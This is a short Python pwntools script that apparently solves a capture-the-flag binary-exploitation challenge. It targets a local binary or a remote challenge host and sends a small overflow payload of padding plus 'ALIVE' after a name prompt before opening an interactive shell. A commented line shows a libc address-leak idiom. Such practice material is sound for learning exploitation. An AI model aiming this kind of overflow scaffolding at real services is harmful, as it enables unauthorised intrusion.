from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./amogus"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("43.205.113.100", 8061)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b"t" * 0x10 + b"ALIVE"
io.sendlineafter("name:\n\n", payload)

io.interactive()
